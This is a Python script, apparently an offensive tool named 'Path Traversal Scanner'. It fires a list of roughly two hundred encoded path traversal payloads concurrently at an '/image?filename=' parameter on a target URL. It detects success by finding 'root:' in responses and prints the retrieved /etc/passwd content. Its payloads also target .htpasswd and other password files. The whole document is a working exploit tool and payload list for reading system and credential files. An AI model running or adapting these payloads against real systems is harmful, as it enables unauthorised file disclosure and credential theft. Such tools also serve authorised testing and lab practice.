import requests 
import urllib3 
import sys 
import re
import argparse 
from concurrent.futures import ThreadPoolExecutor, as_completed

Logo = r'''
______     _   _       _____                                  _  
| ___ \   | | | |     |_   _|                                | | 
| |_/ /_ _| |_| |__     | |_ __ __ ___   _____ _ __ ___  __ _| | 
|  __/ _` | __| '_ \    | | '__/ _` \ \ / / _ \ '__/ __|/ _` | | 
| | | (_| | |_| | | |   | | | | (_| |\ V /  __/ |  \__ \ (_| | | 
\_|  \__,_|\__|_| |_|   \_/_|  \__,_| \_/ \___|_|  |___/\__,_|_| 
                                                                 
                                                                 
         _____                                                   
        /  ___|                                                  
        \ `--.  ___ __ _ _ __  _ __   ___ _ __                   
         `--. \/ __/ _` | '_ \| '_ \ / _ \ '__|                  
        /\__/ / (_| (_| | | | | | | |  __/ |                     
        \____/ \___\__,_|_| |_|_| |_|\___|_|                     
     
     Version 1.0 
     __________________________________________________________________                                                                                                                   
'''

payloads = ['%00../../../../../../etc/passwd', '..%252f..%252f..%252fetc/passwd', '%00/etc/passwd%00', '%0a/bin/cat%20/etc/passwd', '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd', '\\\\&apos;/bin/cat%20/etc/passwd\\\\&apos;', '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd', '/etc/apache2/.htpasswd', '/etc/default/passwd', '/etc/master.passwd', '/./././././././././././etc/passwd', '/../../../../../../../../../../etc/passwd', '/../../../../../../../../../../etc/passwd^^', '/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd', '/etc/passwd', '../../../../../../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../../etc/passwd', '../../../../../../../../../../../etc/passwd', '../../../../../../../../../../etc/passwd', '../../../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../etc/passwd', '../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd', '../etc/passwd', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd', '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', '\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd', 'etc/passwd', '/etc/passwd%00', '/var/www/images/../../../../../../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../../etc/passwd', '/var/www/images/../../../../../../../etc/passwd', '/var/www/images/../../../../../../etc/passwd', '/var/www/images/../../../../../etc/passwd', '/var/www/images/../../../../etc/passwd', '/var/www/images/../../../etc/passwd', '/var/www/images/../../etc/passwd', '/var/www/images/../etc/passwd', '../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../etc/passwd%00', '../../../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../etc/passwd%00', '../../etc/passwd%00', '../etc/passwd%00', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00', '\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00', '/../../../../../../../../../../../etc/passwd%00.html', '/../../../../../../../../../../../etc/passwd%00.jpg', '../../../../../../etc/passwd&=%3C%3C%3C%3C', '/var/www/html/../../../../../../../etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/....\\/etc/passwd', '....\\/....\\/....\\/etc/passwd', '....\\/....\\/etc/passwd', '....\\/etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//....//etc/passwd', '....//....//....//....//....//etc/passwd', '....//....//....//....//etc/passwd', '....//....//....//etc/passwd', '....//....//etc/passwd', '....//etc/passwd', '/etc/pureftpd.passwd', '/etc/security/passwd', '/.htpasswd', '.htpasswd', '../.htpasswd', '/master.passwd', 'member/.htpasswd', 'members/.htpasswd', 'passwd', '/.passwd', '.passwd', '../.passwd', 'passwd.dat', 'root/.htpasswd', 'user/.htpasswd', 'users/.htpasswd', '..2fetc2fpasswd', '..2fetc2fpasswd%00', '..2f..2fetc2fpasswd', '..2f..2fetc2fpasswd%00', '..2f..2f..2fetc2fpasswd', '..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd', '///////../../../etc/passwd']


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


working_payloads = [] 


def Path_Traversal(session, url, proxies=None, payload=None):
    vulnerable_parameter = "/image?filename="
    Vulnerable_url = url + vulnerable_parameter
    
    try:
        request_kwargs = {'verify': False, 'timeout': 5}
        if proxies:
            request_kwargs['proxies'] = proxies
        
        response = session.get(Vulnerable_url + payload, **request_kwargs)
        return (payload, response)
    
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
        return (payload, None)
    except requests.exceptions.Timeout:
        print("[-] Timeout")
        return (payload, None)
    except Exception as e:
        print(f"[-] Error: {e}")
        return (payload, None)

def main () : 
    parser = argparse.ArgumentParser(description='Path Traversal Scanner' ,usage=' python3 %(prog)s -u <target_url>', epilog=f'Example: python3 %(prog)s -u https://example.com -p 127.0.0.1:8080')
    parser.add_argument("-u", "--url" , help="The target URL to test (e.g., https://example.com)" , required=True)
    parser.add_argument("-p", "--proxies" , help="Use Proxies. Format: IP:PORT (default: 127.0.0.1:8080 if -p is used without value)" , nargs='?', const='127.0.0.1:8080', default=None)
    args = parser.parse_args()

    print(Logo)
    session = requests.Session() 
    url = args.url.rstrip('/')
    pattern = re.compile(
    r'^https?:\/\/'                 # http:// or https://
    r'(?:[a-zA-Z0-9-]+\.)+'          # subdomains
    r'[a-zA-Z]{2,}$'                 # top-level domain
    )
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        print(f"[*] Assuming HTTP protocol: {url}")


    if not pattern.match(url):
        print(f"[-] Invalid URL format: {url}")
        print("[-] Please provide a valid URL (e.g., https://example.com)")
        sys.exit(1)


    # Build proxies dictionary if -p argument is provided
    proxies = None
    if args.proxies:
        try:
            # Parse IP:PORT format
            if ':' in args.proxies:
                proxy_ip, proxy_port = args.proxies.rsplit(':', 1)
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                proxies = {'http': proxy_url, 'https': proxy_url}
                print(f"[*] Using proxies: {proxy_url}")
            else:
                print(f"[-] Invalid proxy format. Expected IP:PORT (e.g., 127.0.0.1:8080)")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Error parsing proxy: {e}") 
            sys.exit(1)
    else:
        print(f"[*] No proxies in use.")

    print("[*] Testing ", url)
    print(f"[*] scaning with {len(payloads)} diffrent (/etc/passwd) payloads...")

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(Path_Traversal, session, url, proxies, payload) for payload in payloads]
        for f in as_completed(futures):
            payload, response = f.result()
            if response:
                # Check for successful path traversal (e.g., if /etc/passwd content is returned)
                if response.status_code == 200 and 'root:' in response.text:
                    print(f"[+] Working payload: {payload}")
                    working_payloads.append(payload)
                    output_content = response.text
                    tesing_url = url + "/image?filename=" + payload
                else:
                    print(f"[-] Payload failed: {payload} (Status: {response.status_code})")
            else:
                pass
    if working_payloads :
        print(f"[*] Scan completed. Found {len(working_payloads)} working payloads.")
        print("====="*40)
        print(f"[+] Testing a valid payload:\n{tesing_url}")
        print("====="*40)
        print(f"The Content of /etc/passwd:\n{output_content}")
    else:
        print("[-] The Traget is not vulnerable to Path Traversal attacks with the tested payloads.")

if __name__ == "__main__":
    try:
        main() 
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)









